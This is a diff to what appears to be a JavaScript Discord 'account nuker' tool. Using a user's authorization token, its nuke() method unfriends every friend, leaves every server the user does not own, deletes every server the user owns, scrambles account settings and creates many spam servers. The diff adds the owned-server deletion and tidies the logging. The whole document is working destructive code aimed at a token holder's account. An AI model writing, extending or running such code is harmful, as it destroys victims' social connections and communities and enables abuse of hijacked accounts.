@@ -16,7 +16,9 @@ class User extends Color {
 
       nuke: {
         'Authorization': this.token,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+        "Content-Type": "application/json",
+        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
       }
     };
   };
@@ -36,7 +38,7 @@ class User extends Color {
         `ID       |   ${data.id}`,
         `Language |   ${data.locale}`,
         `Verified |   ${data.verified}`,
-        `Flags    |   All: ${data.flags} | Public: ${data.public_flags}`,
+        `Flags    |   All: ${data.flags} | Private: ${data.public_flags}`,
         `NSFW     |   ${data.nsfw_allowed}`,
         `Avatar   |   ${base + `${data.id}/${data.avatar}.jpg`}`
       ];
@@ -46,22 +48,28 @@ class User extends Color {
   };
 
   async nuke() {
+    const base = 'https://discord.com/api/v8';
+
     await Axios(
-      { method: 'GET', url: 'https://discord.com/api/v8/users/@me/relationships', headers: this.headers.nuke }
+      { method: 'GET', url: base + '/users/@me/relationships', headers: this.headers.nuke }
     ).then(
       (response) => {
         const friends = [];
 
         response.data.forEach(
-          (user) => friends.push(user.id)
+          (friend) => {
+            friends.push(
+              { id: friend.id, tag: friend.user.username + '#' + friend.user.discriminator }
+            );
+          }
         );
 
         friends.forEach(
           (friend) => {
-            Axios.delete(`https://discord.com/api/v8/users/@me/relationships/${friend}`, {
+            Axios.delete(base + `/users/@me/relationships/${friend.id}`, {
               headers: this.headers.nuke
             }).then(
-              () => Color.log(`Unfriended ${friend}`)
+              () => Color.log(`Unfriended ${friend.tag}`)
             ).catch(
               (e) => { Color.log(e, '>', 0); }
             );
@@ -75,21 +83,50 @@ class User extends Color {
     );
 
     await Axios(
-      { method: 'GET', url: 'https://discord.com/api/v8/users/@me/guilds', headers: this.headers.nuke }
+      { method: 'GET', url: base + '/users/@me/guilds', headers: this.headers.nuke }
     ).then(
       (response) => {
-        const guilds = [];
+        const owner = {
+          true: [],
+          false: []
+        };
 
         response.data.forEach(
-          (guild) => guilds.push(guild.id)
+          (guild) => {
+            if (guild.owner == false) {
+              owner.false.push(
+                { id: guild.id, name: guild.name }
+              );
+            } else {
+              owner.true.push(
+                { id: guild.id, name: guild.name }
+              );
+            };
+          }
         );
 
-        guilds.forEach(
+        owner.false.forEach(
           (guild) => {
-            Axios.delete(`https://discord.com/api/v8/users/@me/guilds/${guild}`, {
+            Axios.delete(base + `/users/@me/guilds/${guild.id}`, {
               headers: this.headers.nuke
             }).then(
-              () => Color.log(`Left Server ${guild}`)
+              () => Color.log(`Left Server ${guild.name}`)
+            ).catch(
+              (e) => { Color.log(e, '>', 0); }
+            );
+          }
+        );
+
+        owner.true.forEach(
+          (guild) => {
+            Axios(
+              {
+                method: 'POST',
+                url: base + `/guilds/${guild.id}/delete`,
+                headers: this.headers.nuke
+              }
+            ).then(
+              () => Color.log(`Deleted Server ${guild.name}`)
             ).catch(
               (e) => { Color.log(e, '>', 0); }
             );
@@ -106,7 +143,7 @@ class User extends Color {
       await Axios(
         {
           method: 'PATCH',
-          url: 'https://discord.com/api/v8/users/@me/settings',
+          url: base + '/users/@me/settings',
           headers: this.headers.nuke,
           data: {
             'theme': this.random(['light', 'dark']),
@@ -124,7 +161,7 @@ class User extends Color {
       await Axios(
         {
           method: 'POST',
-          url: 'https://discord.com/api/v6/guilds',
+          url: base + '/guilds',
           headers: this.headers.nuke,
           data: {
             'name': 'endless OP',
@@ -135,7 +172,7 @@ class User extends Color {
         }
       ).then(
         () => {
-          Color.log(`Created a Guild ${i}`);
+          Color.log(`Created a Guild (${i})`);
         }
       ).catch(
         (e) => {
